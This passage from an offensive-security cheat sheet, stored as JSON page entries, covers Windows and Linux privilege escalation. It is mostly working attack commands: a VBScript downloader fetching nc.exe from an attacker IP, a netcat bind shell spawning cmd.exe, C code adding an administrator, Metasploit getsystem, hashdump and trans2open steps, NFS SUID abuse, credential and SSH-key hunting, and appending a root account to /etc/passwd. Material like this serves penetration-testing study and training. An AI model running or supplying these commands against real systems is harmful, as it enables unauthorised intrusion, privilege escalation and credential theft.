\u0026gt;\u0026gt; wget.vbs echo Set http = Nothing \u0026gt;\u0026gt; wget.vbs echo Set http = CreateObject(\u0026quot;WinHttp.WinHttpRequest.5.1\u0026quot;) \u0026gt;\u0026gt; wget.vbs echo If http Is Nothing Then Set http = CreateObject(\u0026quot;WinHttp.WinHttpRequest\u0026quot;) \u0026gt;\u0026gt; wget.vbs echo If http Is Nothing Then Set http = CreateObject(\u0026quot;MSXML2.ServerXMLHTTP\u0026quot;) \u0026gt;\u0026gt; wget.vbs echo If http Is Nothing Then Set http = CreateObject(\u0026quot;Microsoft.XMLHTTP\u0026quot;) \u0026gt;\u0026gt; wget.vbs echo http.Open \u0026quot;GET\u0026quot;,strURL,False \u0026gt;\u0026gt; wget.vbs echo http.Send \u0026gt;\u0026gt; wget.vbs echo varByteArray = http.ResponseBody \u0026gt;\u0026gt; wget.vbs echo Set http = Nothing \u0026gt;\u0026gt; wget.vbs echo Set fs = CreateObject(\u0026quot;Scripting.FileSystemObject\u0026quot;) \u0026gt;\u0026gt; wget.vbs echo Set ts = fs.CreateTextFile(StrFile,True) \u0026gt;\u0026gt; wget.vbs echo strData = \u0026quot;\u0026quot; \u0026gt;\u0026gt; wget.vbs echo strBuffer = \u0026quot;\u0026quot; \u0026gt;\u0026gt; wget.vbs echo For lngCounter = 0 to UBound(varByteArray) \u0026gt;\u0026gt; wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) \u0026gt;\u0026gt; wget.vbs echo Next \u0026gt;\u0026gt; wget.vbs echo ts.Close \u0026gt;\u0026gt; wget.vbs Run with:\n$ cscript wget.vbs http://\u0026lt;attacker_ip\u0026gt;/nc.exe nc.exe Metasploit Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions\n$ exploit/windows/local/service_permissions Privilege escalation\ngetsystem hashdump From admin to system\npsexec.exe -i -s %SystemRoot%\\system32\\cmd.exe Automated scripts. https://github.com/GDSSecurity/Windows-Exploit-Suggester https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe C code Example Add user to administrator group\n#include \u0026lt;stdlib.h\u0026gt; int main () { int i; i = system(\u0026quot;net localgroup administrators theusername /add\u0026quot;); return 0; } i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Run an arbitrary command:\necho -e '#include \u0026lt;stdio.h\u0026gt;\\n#include \u0026lt;smain () {\\nsystem(\u0026quot;C:\\\\Users\\\\Administrator\\\\Desktop\\\\nc -lvp 4313 -e cmd.exe\u0026quot;);\\nreturn(0);\\n}'\u0026gt; poc.c "
},
{
	"uri": "/cheatsheet/blog/linux-privilege-escalation/",
	"title": "Linux Privilege Escalation",
	"tags": ["offensive", "linux", "Privilege"],
	"description": "Guide to Linux Privilege Escalation.",
	"content": "Stable your shell: python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; OR python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll=\u0026#39;ls -lsaht --color=auto\u0026#39; Ctrl + Z [Background Process] stty raw -echo ; fg ; reset stty columns 200 rows 200 Various Capabilities? which gcc which cc which python which perl which wget which curl which fetch which nc which ncat which nc.traditional which socat Compilation file /bin/bash uname -a cat /etc/*-release cat /etc/issue What Arch ? file /bin/bash Kernel? uname -a Issue/Release? cat /etc/issue cat /etc/*-release Are we a real user? sudo -l ls -lsaht /etc/sudoers Are any users a member of exotic groups? groups \u0026lt;user\u0026gt;\nCheck out your shell\u0026rsquo;s environment variables. env https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ Users? cd /home/ ls -lsaht Web Configs containing credentials? cd /var/www/html/ ls -lsaht SUID Binaries? find / -perm -u=s -type f 2\u0026gt;/dev/null\nGUID Binaries? find / -perm -g=s -type f 2\u0026gt;/dev/null\nSUID/GUID/SUDO Escalation: https://gtfobins.github.io/\nstart monitoring the system. https://github.com/DominicBreuker/pspy/blob/master/README.md cd /var/tmp/ File Transfer --\u0026gt; pspy32 File Transfer --\u0026gt; pspy64 chmod 755 pspy32 pspy64 ./pspy\u0026lt;32/64\u0026gt; What does the local network look like? netstat -antup netstat -tunlp Is anything vulnerable running as root? ps aux |grep -i 'root' --color=auto\nMYSQL Credentials? Root Unauthorized Access? mysql -uroot -p Enter Password: root : root root : toor root : look at etc: cd /etc/ ls -lsaht Anything other than root here? • Any config files left behind? → ls -lsaht |grep -i ‘.conf’ --color=auto • If we have root priv information disclosure - are there any .secret in /etc/ files? → ls -lsaht |grep -i ‘.secret’ --color=aut SSH Keys for further compromise? ls -lsaR /home/ Quick look in: ls -lsaht /var/lib/ ls -lsaht /var/db/ Quick look in: ls -lsaht /opt/ ls -lsaht /tmp/ ls -lsaht /var/tmp/ ls -lsaht /dev/shm/ File Transfer Capability? which wget which curl which nc which fetch (BSD) ls -lsaht /bin/ |grep -i \u0026#39;ftp\u0026#39; --color=auto NFS? Can we exploit weak NFS Permissions? cat /etc/exports no_root_squash? https://recipeforroot.com/attacking-nfs-shares/ [On Attacking Machine] mkdir -p /mnt/nfs/ mount -t nfs -o vers=\u0026lt;version 1,2,3\u0026gt; $IP:\u0026lt;NFS Share\u0026gt; /mnt/nfs/ -nolock gcc suid.c -o suid cp suid /mnt/nfs/ chmod u+s /mnt/nfs/suid su \u0026lt;user id matching target machine\u0026#39;s user-level privilege.\u0026gt; [On Target Machine] user@host$ ./suid read, write and execute files? /var/tmp/ /tmp/ /dev/shm/ Any exotic file system mounts/extended attributes? cat /etc/fstab\nForwarding out a weak service for root priv (with meterpreter!): Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port. https://www.offensive-security.com/metasploit-unleashed/portfwd/\nForwarding out netbios-ssn EXAMPLE:\nmeterpreter\u0026gt; portfwd add –l 139 –p 139 –r [target remote host] meterpreter\u0026gt; background use exploit/linux/samba/trans2open set RHOSTS 0.0.0.0 set RPORT 139 run Can we write as a low-privileged user to /etc/passwd? openssl passwd -1 i\u0026lt;3hacking $1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l. echo \u0026#39;attacker:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:attacker:/home/attacker:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd su attacker id Cron. crontab –u root –l Look for unusual system-wide cron jobs: cat /etc/crontab ls /etc/cron.* Bob is a user on this machine. What is every single file he has ever created? find / -user miguel 2\u0026gt;/dev/null\nAny mail? mbox in User $HOME directory? cd /var/mail/ ls -lsaht Linpease: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\nTraitor: https://github.com/liamg/traitor\nGTFOBins: https://gtfobins.github.io/\nPSpy32/Pspy64: https://github.com/DominicBreuker/pspy/blob/master/README.md\nLinux Privilege Escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\n"
},
{
	"uri": "/cheatsheet/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
}]